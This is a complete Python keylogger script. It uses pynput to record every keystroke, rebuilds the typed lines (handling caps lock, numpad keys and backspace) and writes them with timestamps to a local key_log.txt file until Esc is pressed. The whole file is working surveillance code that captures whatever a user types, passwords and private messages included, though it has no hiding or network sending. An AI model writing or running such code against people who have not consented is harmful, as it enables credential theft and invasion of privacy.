from pynput.keyboard import Key, Listener

import logging

log_dir = ""  # path where log is saved
line_buffer = []  # current typed line before return character
window_name = ""  # current window
capson = False  # capslock off (assuming)

logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s:')


def to_ascii(key):
    return ord(getattr(key, 'char', '0'))


def on_press(key):

    global line_buffer
    global capson

    print(key)
    print(to_ascii(key))

    if str(key).startswith("Key") or str(key).startswith("<") or to_ascii(key) < 33:

        if key == Key.caps_lock:
            capson = not capson

        """if numpad is pressed"""
        if str(key).startswith("<"):
            if str(key) == "<12>":  # special case when bloqnum is off
                line_buffer.append(str("5"))
                return True
            new = int(str(key).replace("<", "").replace(">", ""))
            line_buffer.append(str(new - 96))
            return True

        """if return or tab key is pressed"""
        if(key == Key.enter or key == Key.tab):  # return or tab key
            line_buffer.append('\n')  # add a new line
            logging.info("".join(line_buffer))  # write buffer into file
            line_buffer = []  # clear the line buffer
            return True  # exit key

        """if backspace key pressed"""
        if(key == Key.backspace):  # backspace key
            line_buffer = line_buffer[:-1]  # remove last character
            return True  # exit key

        """if space key pressed"""
        if(key == Key.space):  # space key
            line_buffer.append(' ')  # add a space character to buffer
            return True  # exit key

    else:
        """if normal ascii character"""
        if capson:  # capslock on
            # add upper case character to line buffer
            line_buffer.append(chr(to_ascii(key)-32))
        else:
            # add pressed character to line buffer
            line_buffer.append(chr(to_ascii(key)))

    if key == Key.esc:  # when esc key is pressed it finish
        return False


# collect events until released
with Listener(on_press=on_press) as listener:
    listener.join()
